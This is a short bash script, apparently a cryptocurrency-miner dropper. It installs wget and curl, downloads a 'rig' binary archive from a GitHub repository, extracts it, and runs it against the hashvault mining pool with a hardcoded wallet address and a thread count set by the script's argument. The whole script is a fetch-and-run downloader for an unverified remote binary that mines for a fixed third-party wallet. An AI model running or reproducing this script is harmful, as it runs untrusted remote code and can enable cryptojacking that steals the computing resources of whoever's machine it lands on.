#!/bin/bash
DR="wget"
#Downloader
CPU=$1
#cpu usage
WALLET="42bRKUNjG6ARVokh5LJ9LNPiQcFNj76986PCjrQHmbei1mufd8H4wwU9j5S6vi1Fh61G18Pvqbw5NNMG3cX3WrSn1qWZrsr"
FINGERPRINT="420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14"
POOL="pool.hashvault.pro:80"

apt-get install wget curl -y
if [ -s /usr/bin/wget ] ; then LDR="wget" ; else LDR="curl -o rig-64.tar.gz" ;
fi

if [[ ! -d rig-6/ ]] ;
	then
	$LDR https://github.com/0x-raafet/onion_farm/raw/main/rig-64.tar.gz
	tar -xf rig-64.tar.gz && chmod +x rig-6/rig
	./rig-6/rig --url $POOL --user $WALLET -p normal --donate-level 1 --tls --tls-fingerprint $FINGERPRINT --threads=$CPU --cpu-affinity=$CPU ;
else ./rig-6/rig --url $POOL --user $WALLET -p normal --donate-level 1 --tls --tls-fingerprint $FINGERPRINT --threads=$CPU --cpu-affinity=$CPU ;
fi